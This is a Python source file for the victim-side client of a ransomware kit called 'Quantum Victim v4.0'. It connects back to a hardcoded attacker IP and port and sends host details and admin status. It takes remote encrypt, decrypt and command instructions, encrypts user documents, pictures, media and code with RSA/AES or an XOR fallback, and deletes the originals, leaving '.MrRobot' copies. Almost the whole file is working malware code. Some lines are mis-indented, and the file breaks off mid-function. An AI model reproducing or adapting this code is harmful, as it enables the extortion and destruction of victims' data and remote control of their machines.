#!/usr/bin/env python3
"""
QUANTUM VICTIM v4.0 - RSA/AES ENCRYPTION CLIENT
Compatible with Quantum Attacker v4.0
"""
import socket
import sys
import time
import os
import json
import struct
import hashlib
import secrets
import subprocess
import traceback
from threading import Thread
import platform
import tempfile
# MrRobot Mask
MASK = r"""

⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀
⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀
⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀
⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀
⠀⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀
⠀⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

class EncryptionEngine:
    """RSA/AES Hybrid Encryption Engine"""
    
    def __init__(self):
        self.public_key = None
        self.private_key = None
        self.encrypted_extension = ".MrRobot"
        self.crypto_available = self._check_crypto()
    
    def _check_crypto(self):

        """Check if crypto libraries are available"""

        try:

            from Cryptodome.PublicKey import RSA

            from Cryptodome.Cipher import AES, PKCS1_OAEP

            from Cryptodome.Random import get_random_bytes

            return True

        except ImportError:

            try:

                import Cryptodome

                return True

            except:

                return False

    

    def load_public_key(self, public_key_pem):

        """Load RSA public key from PEM string"""
        if not self.crypto_available:
            return False
        
        try:
            # Restore newlines from JSON escaped format
            if '\\n' in public_key_pem:
                public_key_pem = public_key_pem.replace('\\n', '\n').replace('\\r', '\r')
          
            from Cryptodome.PublicKey import RSA
            self.public_key = RSA.import_key(public_key_pem.strip())
            return True
        except Exception as e:
            print(f"    [!] Failed to load public key: {e}")
            return False   
    def load_private_key(self, private_key_pem):
        """Load RSA private key from PEM string"""
        if not self.crypto_available:
            return False    
        try:
            # Restore newlines from JSON escaped format
            if '\\n' in private_key_pem:
                private_key_pem = private_key_pem.replace('\\n', '\n').replace('\\r', '\r')
              from Cryptodome.PublicKey import RSA
            self.private_key = RSA.import_key(private_key_pem.strip())
            return True
        except Exception as e:
            print(f"    [!] Failed to load private key: {e}")
            return False

    def encrypt_file(self, file_path, delete_original=True):
        """Encrypt file using RSA/AES hybrid encryption"""
        if not self.crypto_available:
            print(f"    [!] Crypto libraries not available, using fallback")
            return self._encrypt_fallback(file_path, delete_original)
        if not self.public_key:
            print(f"    [!] No public key available")
            return False
        
        try:
            # Read file data
            with open(file_path, 'rb') as f:
                file_data = f.read()
         
            if len(file_data) == 0:
                return False
            
            print(f"    [RSA/AES] Encrypting: {os.path.basename(file_path)} ({len(file_data)} bytes)")
            
            # Generate random AES key for this file (32 bytes = 256-bit)
            from Cryptodome.Random import get_random_bytes
            from Cryptodome.Cipher import AES, PKCS1_OAEP
            from Cryptodome.Util.Padding import pad
            
            aes_key = get_random_bytes(32)  # AES-256 key
            iv = get_random_bytes(16)       # Initialization vector
           
            # Encrypt file data with AES-CBC
            cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
            padded_data = pad(file_data, AES.block_size)
            encrypted_data = cipher_aes.encrypt(padded_data)
            
            # Encrypt AES key with RSA
            cipher_rsa = PKCS1_OAEP.new(self.public_key)
            encrypted_aes_key = cipher_rsa.encrypt(aes_key)
            
            # Create file header
            header = struct.pack('!4s', b'MRRB')  # Magic bytes
            header += struct.pack('!H', 1)        # Version
            header += struct.pack('!I', len(encrypted_aes_key))
            header += struct.pack('!I', len(iv))
            header += struct.pack('!Q', len(file_data))  # Original size
            
            # Write encrypted file
            encrypted_path = file_path + self.encrypted_extension
            with open(encrypted_path, 'wb') as f:
                f.write(header)
                f.write(encrypted_aes_key)
                f.write(iv)
                f.write(encrypted_data)
            
            # Verify encryption
            if os.path.exists(encrypted_path) and os.path.getsize(encrypted_path) > 0:
                if delete_original:
                    try:
                        os.remove(file_path)
                 except:
                        pass
                print(f"    [✓] Encrypted successfully")
                return True
            else:
                print(f"    [!] Failed to create encrypted file")
                return False
            
        except Exception as e:
            print(f"    [!] RSA/AES encryption error: {e}")
            traceback.print_exc()
            return False
    
    def decrypt_file(self, encrypted_path):
        """Decrypt file using RSA private key"""
        if not self.crypto_available:
            print(f"    [!] Crypto libraries not available, using fallback")
            return self._decrypt_fallback(encrypted_path)
        
        if not self.private_key:
            print(f"    [!] No private key available")
            return False
        
        if not encrypted_path.endswith(self.encrypted_extension):
            return False
        
        try:
            with open(encrypted_path, 'rb') as f:
                # Read header
                magic = f.read(4)
                if magic != b'MRRB':
                    return False
                
                version = struct.unpack('!H', f.read(2))[0]
                aes_key_size = struct.unpack('!I', f.read(4))[0]
                iv_size = struct.unpack('!I', f.read(4))[0]
                original_size = struct.unpack('!Q', f.read(8))[0]
                
                # Read encrypted components
                encrypted_aes_key = f.read(aes_key_size)
                iv = f.read(iv_size)
                encrypted_data = f.read()
            
            print(f"    [RSA/AES] Decrypting: {os.path.basename(encrypted_path)}")
            
           # Decrypt AES key with RSA
            from Cryptodome.Cipher import AES, PKCS1_OAEP
            from Cryptodome.Util.Padding import unpad
            
            cipher_rsa = PKCS1_OAEP.new(self.private_key)
            aes_key = cipher_rsa.decrypt(encrypted_aes_key)
            
            # Decrypt file data with AES-CBC
            cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
            padded_data = cipher_aes.decrypt(encrypted_data)
            file_data = unpad(padded_data, AES.block_size)
            
           # Verify size
            if len(file_data) != original_size:
                print(f"    [!] Size mismatch: expected {original_size}, got {len(file_data)}")
                return False
            
            # Write decrypted file
            original_path = encrypted_path.replace(self.encrypted_extension, '')
            with open(original_path, 'wb') as f:
                f.write(file_data)
            
            # Remove encrypted file
            os.remove(encrypted_path)
            print(f"    [✓] Decrypted successfully")
            return True
            
        except Exception as e:
            print(f"    [!] RSA/AES decryption error: {e}")
            return False
    
    def _encrypt_fallback(self, file_path, delete_original=True):
        """Fallback XOR encryption if crypto not available"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            if len(data) == 0:
                return False
            
            print(f"    [FALLBACK] Encrypting: {os.path.basename(file_path)}")
            
            # Simple XOR with random key
            key = secrets.token_bytes(32)
            key_len = len(key)
            encrypted = bytearray(data)
            
            for i in range(len(encrypted)):
                encrypted[i] ^= key[i % key_len]
            
            # Add header for fallback
            header = struct.pack('!4s', b'FALL')  # Fallback magic
            header += struct.pack('!H', 1)        # Version
            header += struct.pack('!I', len(key))
            header += struct.pack('!Q', len(data))
            
            encrypted_path = file_path + self.encrypted_extension
            with open(encrypted_path, 'wb') as f:
                f.write(header)
                f.write(key)
                f.write(encrypted)
            
            if delete_original and os.path.exists(encrypted_path):
                os.remove(file_path)
                print(f"    [✓] Fallback encryption successful")
                return True
            
            return False
            
        except Exception as e:
            print(f"    [!] Fallback encryption error: {e}")
            return False
    
    def _decrypt_fallback(self, encrypted_path):
        """Fallback XOR decryption"""
        if not encrypted_path.endswith(self.encrypted_extension):
            return False
        
        try:
            with open(encrypted_path, 'rb') as f:
                magic = f.read(4)
                if magic != b'FALL':
                    return False
                
                version = struct.unpack('!H', f.read(2))[0]
                key_size = struct.unpack('!I', f.read(4))[0]
                original_size = struct.unpack('!Q', f.read(8))[0]  
                key = f.read(key_size)
                encrypted = f.read()
           
            print(f"    [FALLBACK] Decrypting: {os.path.basename(encrypted_path)}")
            
           # XOR decryption
            key_len = len(key)
            decrypted = bytearray(encrypted)      
            for i in range(len(decrypted)):
                decrypted[i] ^= key[i % key_len]
            # Verify size
            if len(decrypted) != original_size:
                return False
            
            original_path = encrypted_path.replace(self.encrypted_extension, '')
            with open(original_path, 'wb') as f:
                f.write(decrypted)
            
            os.remove(encrypted_path)
            print(f"    [✓] Fallback decryption successful")
            return True
            
        except Exception as e:
            print(f"    [!] Fallback decryption error: {e}")
            return False

class QuantumVictim:
    """Main Victim Client"""
    
    def __init__(self, attacker_ip='192.168.174.128', attacker_port=5555):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.socket = None
        self.running = False
        self.victim_id = None
        self.connection_time = None
        
        # Encryption engine
        self.encryption_engine = EncryptionEngine()
        
        # Print mask
        print(MASK)
        print(f"\n{'='*80}")
        print("QUANTUM VICTIM v4.0 - RSA/AES ENCRYPTION")
        print(f"{'='*80}")
        
        # Target extensions
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.pdf', '.rtf', '.odt',
            '.xls', '.xlsx', '.csv', '.ods', '.ppt', '.pptx',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp3', 
            '.mp4', '.avi', '.mkv', '.mov', '.wav', '.flac',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.py', '.java', '.cpp', '.c', '.js', '.html', 
            '.css', '.php', '.xml', '.json', '.sql', '.db',
            '.ini', '.cfg', '.conf', '.config', '.yml', '.yaml'
        ]
        
        # Excluded directories
        self.excluded_dirs = []
        if os.name == 'nt':
            self.excluded_dirs = [
                'C:\\Windows\\',
                'C:\\Program Files\\',
                'C:\\Program Files (x86)\\',
                'C:\\$Recycle.Bin\\',
            ]
        else:
            self.excluded_dirs = [
                '/bin/', '/usr/bin/', '/usr/local/bin/',
                '/lib/', '/usr/lib/', '/etc/', '/var/',
            ]
        
        current_dir = os.path.dirname(os.path.abspath(__file__))
        self.excluded_dirs.append(current_dir + os.sep)
       
        print(f"[+] Attacker: {attacker_ip}:{attacker_port}")
        print(f"[+] Encryption: RSA/AES Hybrid")
        print(f"[+] Crypto Available: {self.encryption_engine.crypto_available}")
        print(f"[+] Encrypted extension: .MrRobot")
        print(f"[+] Platform: {platform.system()}")
        
        try:
            print(f"[+] User: {os.getlogin()}")
        except:
            print(f"[+] User: SYSTEM")
       
        print(f"{'='*80}")
    
    def _get_victim_id(self):
        """Generate unique victim ID"""
        hostname = socket.gethostname()
        uid = hashlib.sha256(
            f"{hostname}{platform.node()}{os.getpid()}".encode()
        ).hexdigest()[:16]
        return f"{hostname}-{uid}"
    
    def connect(self):

        """Connect to attacker with retry logic"""

        self.victim_id = self._get_victim_id()

        attempt = 1

        max_attempts = 10

        base_wait = 2

        

        while attempt <= max_attempts and not self.running:

            print(f"\n[*] Connection attempt {attempt}/{max_attempts}")

            

            try:

                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                self.socket.settimeout(10)

                print(f"[*] Connecting to {self.attacker_ip}:{self.attacker_port}...")

                self.socket.connect((self.attacker_ip, self.attacker_port))

                self.socket.settimeout(30)

                self.running = True

                self.connection_time = time.time()

                

                print(f"[+] Connected successfully!")

                print(f"[+] Victim ID: {self.victim_id}")

                print(f"[+] Connection time: {time.ctime()}")

                

                if self._perform_handshake():

                    print("[+] Handshake completed successfully")

                    self._main_loop()

                else:

                    print("[-] Handshake failed")

                    self.running = False

                

            except socket.timeout:

                print(f"[-] Connection timeout")

            except ConnectionRefusedError:

                print(f"[-] Connection refused - attacker may not be running")

            except Exception as e:

                print(f"[-] Connection error: {e}")

                traceback.print_exc()

            

            if not self.running:

                if self.socket:

                    try:

                        self.socket.close()

                    except:

                        pass

                    self.socket = None

                

                if attempt < max_attempts:

                    wait_time = min(base_wait * (2 ** (attempt - 1)), 30)

                    print(f"[*] Retrying in {wait_time} seconds...")

                    time.sleep(wait_time)

                

                attempt += 1

        

        if not self.running:

            print("\n[-] Failed to establish connection after all attempts")

            print(f"[-] Make sure attacker is running on {self.attacker_ip}:{self.attacker_port}")

    

    def _perform_handshake(self):

        """Perform handshake with attacker"""

        try:

            # Receive attacker handshake

            handshake = self._receive_json(timeout=15)

            if not handshake or handshake.get("type") != "handshake":

                print("[-] Invalid handshake from attacker")

                return False

            

            print("[+] Received attacker handshake")

            

            # Check for public key in handshake

            public_key_pem = handshake.get("public_key")

            if public_key_pem:

                if self.encryption_engine.load_public_key(public_key_pem):

                    print("[+] Loaded attacker RSA public key")

                else:

                    print("[!] Failed to load RSA public key")

            

            # Check admin status

            admin_status = False

            if platform.system() == 'Windows':

                try:

                    import ctypes

                    admin_status = ctypes.windll.shell32.IsUserAnAdmin() != 0

                except:

                    pass

            

            # Send response

            response = {

                "type": "handshake_response",

                "victim_id": self.victim_id,

                "hostname": socket.gethostname(),

                "platform": platform.system(),

                "admin_privileges": admin_status,

                "python_version": sys.version.split()[0],

                "crypto_available": self.encryption_engine.crypto_available,

                "target_extensions": len(self.target_extensions),

                "txt_included": '.txt' in self.target_extensions,

                "encrypted_extension": ".MrRobot",

                "timestamp": time.time()

            }

            

            if not self._send_json(response):

                print("[-] Failed to send handshake response")

                return False

            

            # Receive confirmation

            confirmation = self._receive_json(timeout=10)

            if confirmation and confirmation.get("type") == "session_confirmation":

                print("[+] Session established successfully")

                return True

            

            return False

            

        except Exception as e:

            print(f"[-] Handshake error: {e}")

            traceback.print_exc()

            return False

    

    def _send_json(self, data):

        """Send JSON data with proper encoding"""

        try:

            # Ensure all data is JSON serializable

            json_str = json.dumps(data, ensure_ascii=False)

            encoded = json_str.encode('utf-8')

            length = len(encoded)

            

            # Send length prefix

            self.socket.sendall(struct.pack('!I', length))

            # Send data

            self.socket.sendall(encoded)

            return True

            

        except Exception as e:

            print(f"[-] Send error: {e}")

            return False

    

    def _receive_json(self, timeout=30):

        """Receive JSON data with error handling"""

        try:

            self.socket.settimeout(timeout)

            

            # Read length prefix

            length_data = b''

            while len(length_data) < 4:

                chunk = self.socket.recv(4 - len(length_data))

                if not chunk:

                    return None

                length_data += chunk

            

            length = struct.unpack('!I', length_data)[0]

            

            # Safety check

            if length > 10 * 1024 * 1024:  # 10MB max

                print(f"[-] Message too large: {length} bytes")

                return None

            

            # Read JSON data

            data = b''

            bytes_received = 0

            while bytes_received < length:

                chunk = self.socket.recv(min(4096, length - bytes_received))

                if not chunk:

                    return None

                data += chunk

                bytes_received += len(chunk)

            

            # Decode and parse

            try:

                decoded_data = data.decode('utf-8', errors='ignore')

                return json.loads(decoded_data)

            except json.JSONDecodeError as e:

                print(f"[-] JSON decode error: {e}")

                # Print first 200 chars for debugging

                print(f"[-] Raw data: {decoded_data[:200]}...")

                return None

                

        except socket.timeout:

            return None

        except Exception as e:

            print(f"[-] Receive error: {e}")

            return None

    

    def _main_loop(self):

        """Main communication loop"""

        print("\n[+] Ready for commands...")

        

        while self.running:

            try:

                command = self._receive_json(timeout=5)

                if command:

                    self._handle_command(command)

                

                # Send heartbeat occasionally

                if self.connection_time and time.time() - self.connection_time > 300:

                    self._send_heartbeat()

                    self.connection_time = time.time()

                    

            except socket.timeout:

                continue

            except Exception as e:

                print(f"[-] Main loop error: {e}")

                traceback.print_exc()

                break

        

        self.cleanup()

    

    def _send_heartbeat(self):

        """Send heartbeat to keep connection alive"""

        try:

            heartbeat = {

                "type": "heartbeat",

                "victim_id": self.victim_id,

                "timestamp": time.time()

            }

            self._send_json(heartbeat)

        except:

            pass

    

    def _handle_command(self, command):

        """Handle incoming command"""

        cmd_type = command.get("type", "unknown")

        print(f"\n[+] Received command: {cmd_type}")

        

        try:

            if cmd_type == "encrypt":

                self._handle_encryption(command)

            elif cmd_type == "decrypt":

                self._handle_decryption(command)

            elif cmd_type == "scan":

                self._handle_scan(command)

            elif cmd_type == "status":

                self._handle_status(command)

            elif cmd_type == "command":

                self._execute_command(command)

            elif cmd_type == "heartbeat":

                # Acknowledge heartbeat

                pass

            else:

                print(f"[-] Unknown command type: {cmd_type}")

                error_response = {

                    "type": "error",

                    "error": f"Unknown command type: {cmd_type}",

                    "timestamp": time.time()

                }

                self._send_json(error_response)

                

        except Exception as e:

            print(f"[-] Command handling error: {e}")

            traceback.print_exc()

            error_response = {

                "type": "error",

                "error": str(e),

                "command": cmd_type,

                "timestamp": time.time()

            }

            self._send_json(error_response)

    

    def _handle_encryption(self, command):

        """Handle encryption command"""

        location = command.get("location", "documents")

        delete_original = command.get("delete_original", True)

        public_key_pem = command.get("public_key", None)

        

        if public_key_pem:

            if self.encryption_engine.load_public_key(public_key_pem):

                print("[+] Using RSA public key from attacker")

        

        print(f"\n{'='*60}")

        print(f"[+] Starting encryption for: {location}")

        print(f"[+] Delete original: {'YES' if delete_original else 'NO'}")

        print(f"[+] Method: {'RSA/AES' if self.encryption_engine.crypto_available else 'Fallback'}")

        print(f"{'='*60}")

        

        try:

            target_files = self._find_target_files(location)

            

            if not target_files:

                response = {

                    "type": "encryption_result",

                    "success": False,

                    "error": "No target files found",

                    "location": location,

                    "timestamp": time.time()

                }

                self._send_json(response)

                return

            

            print(f"[+] Found {len(target_files)} target files")

            txt_count = len([f for f in target_files if f.lower().endswith('.txt')])

            print(f"[+] TXT files: {txt_count}")

            

            files_to_process = target_files

            encrypted_count = 0

            failed_count = 0

            txt_encrypted = 0

            

            print(f"[+] Processing {len(files_to_process)} files...")

            

            for i, filepath in enumerate(files_to_process, 1):

                try:

                    filename = os.path.basename(filepath)

                    print(f"  [{i}/{len(files_to_process)}] {filename[:40]}...")

                    

                    success = self.encryption_engine.encrypt_file(filepath, delete_original)

                    if success:

                        encrypted_count += 1

                        if filepath.lower().endswith('.txt'):

                            txt_encrypted += 1

                    else:

                        failed_count += 1

                    

                    # Send progress update

                    if i % 10 == 0 or i == len(files_to_process):

                        progress = {

                            "type": "progress",

                            "operation": "encrypt",

                            "current": i,

                            "total": len(files_to_process),

                            "successful": encrypted_count,

                            "failed": failed_count,

                            "txt_encrypted": txt_encrypted,

                            "timestamp": time.time()

                        }

                        self._send_json(progress)

                        

                except Exception as e:

                    print(f"  [-] Error: {e}")

                    failed_count += 1

            

            # Send final result

            result = {

                "type": "encryption_result",

                "success": encrypted_count > 0,

                "location": location,

                "encrypted_count": encrypted_count,

                "failed_count": failed_count,

                "txt_encrypted": txt_encrypted,

                "total_files": len(files_to_process),

                "encryption_method": "rsa_aes" if self.encryption_engine.crypto_available else "fallback",

                "delete_original": delete_original,

                "timestamp": time.time()

            }

            

            self._send_json(result)

            

            print(f"\n{'='*60}")

            print(f"[+] ENCRYPTION COMPLETE!")

            print(f"{'='*60}")

            print(f"    Successfully encrypted: {encrypted_count}/{len(files_to_process)}")

            print(f"    TXT files encrypted: {txt_encrypted}")

            print(f"    Method: {'RSA/AES' if self.encryption_engine.crypto_available else 'Fallback'}")

            if delete_original:

                print(f"    Original files were DELETED")

            print(f"{'='*60}")

            

        except Exception as e:

            print(f"[-] Encryption error: {e}")

            traceback.print_exc()

            error_response = {

                "type": "error",

                "error": f"Encryption failed: {str(e)}",

                "timestamp": time.time()

            }

            self._send_json(error_response)

    

    def _handle_decryption(self, command):

        """Handle decryption command"""

        private_key_pem = command.get("private_key", None)

        

        if private_key_pem:

            if self.encryption_engine.load_private_key(private_key_pem):

                print("[+] Using RSA private key from attacker")

        

        print(f"\n{'='*60}")

        print("[+] Starting decryption...")

        print(f"[+] Private key available: {'YES' if self.encryption_engine.private_key else 'NO'}")

        print(f"{'='*60}")

        

        try:

            encrypted_files = self._find_encrypted_files()

            

            if not encrypted_files:

                response = {

                    "type": "decryption_result",

                    "success": False,

                    "error": "No .MrRobot files found",

                    "timestamp": time.time()

                }

                self._send_json(response)

                return

            

            print(f"[+] Found {len(encrypted_files)} .MrRobot files")

            

            decrypted_count = 0

            failed_count = 0

            txt_decrypted = 0

            

            print(f"[+] Starting decryption...")

            

            for i, filepath in enumerate(encrypted_files, 1):

                try:

                    filename = os.path.basename(filepath)

                    print(f"  [{i}/{len(encrypted_files)}] {filename[:40]}...")

                    

                    if self.encryption_engine.decrypt_file(filepath):

                        decrypted_count += 1

                        if filepath.lower().replace('.MrRobot', '').endswith('.txt'):

                            txt_decrypted += 1

                    else:

                        failed_count += 1

                    

                    # Send progress

                    if i % 10 == 0 or i == len(encrypted_files):

                        progress = {

                            "type": "progress",

                            "operation": "decrypt",

                            "current": i,

                            "total": len(encrypted_files),

                            "successful": decrypted_count,

                            "failed": failed_count,

                            "txt_decrypted": txt_decrypted,

                            "timestamp": time.time()

                        }

                        self._send_json(progress)

                        

                except Exception as e:

                    print(f"  [-] Error: {e}")

                    failed_count += 1

            

            # Send result

            result = {

                "type": "decryption_result",

                "success": decrypted_count > 0,

                "decrypted_count": decrypted_count,

                "failed_count": failed_count,

                "txt_decrypted": txt_decrypted,

                "total_files": len(encrypted_files),

                "decryption_method": "rsa_aes" if self.encryption_engine.crypto_available else "fallback",

                "timestamp": time.time()

            }

            

            self._send_json(result)

            

            print(f"\n{'='*60}")

            print(f"[+] DECRYPTION COMPLETE!")

            print(f"{'='*60}")

            print(f"    Successfully decrypted: {decrypted_count}/{len(encrypted_files)}")

            print(f"    TXT files decrypted: {txt_decrypted}")

            print(f"    Method: {'RSA/AES' if self.encryption_engine.crypto_available else 'Fallback'}")

            print(f"{'='*60}")

            

        except Exception as e:

            print(f"[-] Decryption error: {e}")

            traceback.print_exc()

            error_response = {

                "type": "error",

                "error": f"Decryption failed: {str(e)}",

                "timestamp": time.time()

            }

            self._send_json(error_response)

    

    def _find_target_files(self, location):

        """Find target files based on location"""

        target_files = []

        

        # Determine directories to scan

        scan_dirs = []

        

        if location == "all":

            if os.name == 'nt':

                scan_dirs = [

                    os.path.expanduser('~\\Documents'),

                    os.path.expanduser('~\\Desktop'),

                    os.path.expanduser('~\\Downloads'),

                ]

            else:

                scan_dirs = [

                    os.path.expanduser('~/Documents'),

                    os.path.expanduser('~/Desktop'),

                    os.path.expanduser('~/Downloads'),

                ]

        elif location == "documents":

            scan_dirs = [os.path.expanduser('~\\Documents' if os.name == 'nt' else '~/Documents')]

        elif location == "desktop":

            scan_dirs = [os.path.expanduser('~\\Desktop' if os.name == 'nt' else '~/Desktop')]

        elif location == "downloads":

            scan_dirs = [os.path.expanduser('~\\Downloads' if os.name == 'nt' else '~/Downloads')]

        elif location == "pictures":

            scan_dirs = [os.path.expanduser('~\\Pictures' if os.name == 'nt' else '~/Pictures')]

        elif location == "music":

            scan_dirs = [os.path.expanduser('~\\Music' if os.name == 'nt' else '~/Music')]

        elif location == "videos":

            scan_dirs = [os.path.expanduser('~\\Videos' if os.name == 'nt' else '~/Videos')]

        else:

            scan_dirs = [location]

        

        # Scan for files

        for scan_dir in scan_dirs:

            if not os.path.exists(scan_dir):

                print(f"  [!] Directory not found: {scan_dir}")

                continue

            

            print(f"  [+] Scanning: {scan_dir}")

            

            try:

                file_count = 0

                txt_count = 0

                for root, dirs, files in os.walk(scan_dir):

                    # Skip excluded directories

                    skip_branch = False

                    for excluded in self.excluded_dirs:

                        if root.lower().startswith(excluded.lower()):

                            dirs[:] = []

                            skip_branch = True

                            break

                    

                    if skip_branch:

                        continue

                    

                    # Skip hidden/system directories

                    dirs[:] = [d for d in dirs if not d.startswith('.') and not d.startswith('$')]

                    

                    for filename in files:

                        # Skip already encrypted files

                        if filename.endswith('.MrRobot'):

                            continue

                        

                        # Skip hidden/system files

